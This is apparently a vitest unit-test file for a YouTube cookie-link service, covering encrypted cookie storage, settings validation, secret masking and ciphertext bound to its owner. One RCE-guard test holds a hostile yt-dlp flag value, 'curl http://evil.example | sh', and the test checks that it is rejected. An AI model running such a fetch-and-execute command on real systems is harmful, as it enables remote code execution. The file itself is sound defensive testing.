import { describe, it, expect, vi, beforeEach } from 'vitest';

const store: Record<string, any> = {};
vi.mock('../db', () => ({
	prisma: {
		youTubeLink: {
			upsert: vi.fn(async ({ where, create, update }) => {
				store[where.userId] = { ...(store[where.userId] || create), ...update, ...create };
				return store[where.userId];
			}),
			findUnique: vi.fn(async ({ where }) => store[where.userId] ?? null),
			delete: vi.fn(async ({ where }) => {
				delete store[where.userId];
			}),
			update: vi.fn(async ({ where, data }) => {
				store[where.userId] = { ...store[where.userId], ...data };
				return store[where.userId];
			}),
			updateMany: vi.fn(async ({ where, data }) => {
				if (store[where.userId]) {
					Object.assign(store[where.userId], data);
					return { count: 1 };
				}
				return { count: 0 };
			}),
		},
		// Read by computeCookieStatus, which is what turns an unusable link row into
		// the `needsRelink` the UI acts on.
		settings: { findUnique: vi.fn(async () => null) },
		eventLog: { findFirst: vi.fn(async () => null) },
	},
}));

process.env.AUTH_SECRET = 'test-secret-for-link-service';
import { youtubeLinkService } from './youtube-link.service';
import { SECRET_MASK } from './settings-validation';
import { encryptSecret } from '../utils/crypto-box';
import { computeCookieStatus } from '../utils/cookie-status';

const cookies = [{ domain: '.youtube.com', name: 'SAPISID', value: 'abc', secure: true }];

describe('youtubeLinkService', () => {
	beforeEach(() => {
		for (const k of Object.keys(store)) delete store[k];
	});

	it('stores and returns decrypted cookies.txt', async () => {
		await youtubeLinkService.storeCookies('u1', cookies, { channelName: 'Me' });
		const txt = await youtubeLinkService.getCookiesTxt('u1');
		expect(txt).toContain('SAPISID');
		expect(txt).toContain('# Netscape HTTP Cookie File');
	});

	it('reports link status', async () => {
		await youtubeLinkService.storeCookies('u1', cookies, { channelName: 'Me' });
		const s = await youtubeLinkService.getLinkStatus('u1');
		expect(s.linked).toBe(true);
		expect(s.channelName).toBe('Me');
	});

	it('rejects cookie sets without auth cookies', async () => {
		await expect(
			youtubeLinkService.storeCookies('u1', [{ domain: '.youtube.com', name: 'PREF', value: 'x' }]),
		).rejects.toThrow();
	});

	it('unlink wipes the record', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await youtubeLinkService.unlink('u1');
		expect(await youtubeLinkService.getCookiesTxt('u1')).toBeNull();
	});

	it('updateToggles whitelists only allowed keys and is graceful on missing link', async () => {
		await youtubeLinkService.storeCookies('u1', cookies, { channelName: 'Original' });
		const before = store['u1'];
		const originalEnc = before.cookiesEnc;
		const originalUserId = before.userId;

		await youtubeLinkService.updateToggles('u1', {
			syncWatchLater: true,
			cookiesEnc: 'HACKED',
			userId: 'evil',
		} as any);

		const after = await youtubeLinkService.getLinkStatus('u1');
		expect(after.toggles?.syncWatchLater).toBe(true);
		expect(store['u1'].cookiesEnc).toBe(originalEnc);
		expect(store['u1'].userId).toBe(originalUserId);

		// Missing link is a no-op, does not throw
		await expect(
			youtubeLinkService.updateToggles('unknownUser', { syncHistoryToWytui: false }),
		).resolves.toBeUndefined();
	});
});

describe('account settings overrides', () => {
	beforeEach(() => {
		for (const k of Object.keys(store)) delete store[k];
	});

	it('requires a linked account', async () => {
		await expect(
			youtubeLinkService.updateAccountSettings('nobody', { proxyUrl: 'http://p:1' }),
		).rejects.toThrow('No linked YouTube account');
	});

	it('rejects invalid proxy URLs', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await expect(
			youtubeLinkService.updateAccountSettings('u1', { proxyUrl: 'not a url' }),
		).rejects.toThrow(/proxy URL/i);
	});

	it('rejects extraFlags outside the yt-dlp whitelist (RCE guard)', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await expect(
			youtubeLinkService.updateAccountSettings('u1', {
				extraFlags: ['--exec', 'curl http://evil.example | sh'],
			}),
		).rejects.toThrow(/forbidden flag/i);
	});

	it('persists proxy, flags, and notification settings; empty clears', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await youtubeLinkService.updateAccountSettings('u1', {
			proxyUrl: ' socks5://h:1080 ',
			extraFlags: [' --sleep-requests 1', '', '  '],
			appriseUrl: ' http://apprise:8000 ',
			notifyOnComplete: true,
			notifyOnFail: false,
		});
		// Both URLs carry credentials, so what is stored and what is served differ:
		// the row keeps the value, the status payload reports only that one is set.
		expect(store['u1'].proxyUrl).toBe('socks5://h:1080');
		expect(store['u1'].appriseUrl).toBe('http://apprise:8000');
		const status: any = await youtubeLinkService.getLinkStatus('u1');
		expect(status.ytdlp).toEqual({
			proxyUrl: SECRET_MASK,
			extraFlags: ['--sleep-requests 1'],
		});
		expect(status.notifications).toEqual({
			appriseUrl: SECRET_MASK,
			notifyOnComplete: true,
			notifyOnFail: false,
		});

		await youtubeLinkService.updateAccountSettings('u1', { proxyUrl: '', appriseUrl: null });
		const cleared: any = await youtubeLinkService.getLinkStatus('u1');
		expect(cleared.ytdlp.proxyUrl).toBeNull();
		expect(cleared.notifications.appriseUrl).toBeNull();
	});

	it('does not save the mask when a form round-trips it back (GET → PATCH)', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		await youtubeLinkService.updateAccountSettings('u1', {
			proxyUrl: 'socks5://h:1080',
			appriseUrl: 'http://apprise:8000',
		});
		const shown: any = await youtubeLinkService.getLinkStatus('u1');
		expect(shown.ytdlp.proxyUrl).toBe(SECRET_MASK);

		// The account form posts the masked fields straight back on save.
		await youtubeLinkService.updateAccountSettings('u1', {
			proxyUrl: shown.ytdlp.proxyUrl,
			appriseUrl: shown.notifications.appriseUrl,
			notifyOnComplete: true,
		});

		expect(store['u1'].proxyUrl).toBe('socks5://h:1080');
		expect(store['u1'].appriseUrl).toBe('http://apprise:8000');
		// Only the two masked fields are skipped — the rest of the PATCH applied.
		expect(store['u1'].notifyOnComplete).toBe(true);
	});

	it('treats explicit undefined fields as not provided (API route passes every key)', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		// /api/youtube/link destructures all account fields and forwards them,
		// so unsubmitted ones arrive as { key: undefined } — not absent keys.
		await youtubeLinkService.updateAccountSettings('u1', {
			proxyUrl: undefined,
			extraFlags: undefined,
			appriseUrl: undefined,
			notifyOnComplete: undefined,
			notifyOnFail: undefined,
			jellyfinUserId: 'ju-1',
		});
		const status: any = await youtubeLinkService.getLinkStatus('u1');
		expect(status.jellyfinUserId).toBe('ju-1');

		await youtubeLinkService.updateAccountSettings('u1', { jellyfinUserId: null });
		const cleared: any = await youtubeLinkService.getLinkStatus('u1');
		expect(cleared.jellyfinUserId).toBeNull();
	});

	it('getSessionHealth tells unlinked apart from a session that will not decrypt', async () => {
		expect(await youtubeLinkService.getSessionHealth('u1')).toEqual({
			linked: false,
			usable: false,
			cookieUpdatedAt: null,
		});

		await youtubeLinkService.storeCookies('u1', cookies);
		const healthy = await youtubeLinkService.getSessionHealth('u1');
		expect(healthy.linked).toBe(true);
		expect(healthy.usable).toBe(true);
		expect(healthy.cookieUpdatedAt).toBeInstanceOf(Date);

		// A blob that predates a key rotation (or was written corrupted) still
		// counts as linked — the UI has to say "re-link", not "link".
		store['u1'].cookiesEnc = 'not-a-ciphertext';
		expect(await youtubeLinkService.getSessionHealth('u1')).toMatchObject({
			linked: true,
			usable: false,
		});
	});
});

describe('session is bound to its owner (AAD)', () => {
	beforeEach(() => {
		for (const k of Object.keys(store)) delete store[k];
	});

	it('binds the ciphertext to the row that wrote it', async () => {
		await youtubeLinkService.storeCookies('u1', cookies);
		expect(await youtubeLinkService.getCookiesTxt('u1')).toContain('SAPISID');

		// The attack the binding closes: the blob itself is copied onto another
		// account's row (a bad migration, a restored backup, an injection that can
		// write a column but not derive the key). It is still valid ciphertext, and
		// it still has to be worthless there.
		store['u2'] = { ...store['u1'], userId: 'u2' };
		expect(await youtubeLinkService.getCookiesTxt('u2')).toBeNull();
		expect(await youtubeLinkService.getSessionHealth('u2')).toMatchObject({
			linked: true,
			usable: false,
		});
		// The real owner is untouched.
		expect(await youtubeLinkService.getCookiesTxt('u1')).toContain('SAPISID');
	});

	it('treats a pre-binding blob as a dead session, and re-linking repairs it', async () => {
		// Every stored session was written before the binding existed. The upgrade
		// is intentional and one-time: the old blob must fail, the account must read
		// as needing a re-link rather than as never linked, and the next push from
		// the extension must produce a working session again.
		await youtubeLinkService.storeCookies('u1', cookies);
		store['u1'].cookiesEnc = encryptSecret(
			'# Netscape HTTP Cookie File\n.youtube.com\tTRUE\t/\tTRUE\t0\tSAPISID\tabc',
		);

		expect(await youtubeLinkService.getCookiesTxt('u1')).toBeNull();
		expect(await youtubeLinkService.getSessionHealth('u1')).toMatchObject({
			linked: true,
			usable: false,
		});
		// This is what the settings UI renders as "re-link via the extension".
		const status = await computeCookieStatus('u1');
		expect(status.needsRelink).toBe(true);
		expect(status.linked).toBe(true);

		// Re-linking: the stale blob reads as a change (it cannot be compared), so
		// the cookie-gated downloads get re-armed, and the session works after.
		const relinked = await youtubeLinkService.storeCookies('u1', cookies);
		expect(relinked.changed).toBe(true);
		expect(await youtubeLinkService.getCookiesTxt('u1')).toContain('SAPISID');
		expect((await computeCookieStatus('u1')).needsRelink).toBe(false);
	});

	it('still recognises an unchanged jar now that compare is bound too', async () => {
		// sameStoredCookies has to decrypt with the same AAD as the writer, or every
		// hourly refresh looks like new credentials and restarts the retry cycle.
		await youtubeLinkService.storeCookies('u1', cookies);
		expect((await youtubeLinkService.storeCookies('u1', cookies)).changed).toBe(false);
		expect(
			(
				await youtubeLinkService.storeCookies('u1', [
					...cookies,
					{ domain: '.youtube.com', name: 'SAPISID', value: 'rotated', secure: true },
				])
			).changed,
		).toBe(true);
	});
});
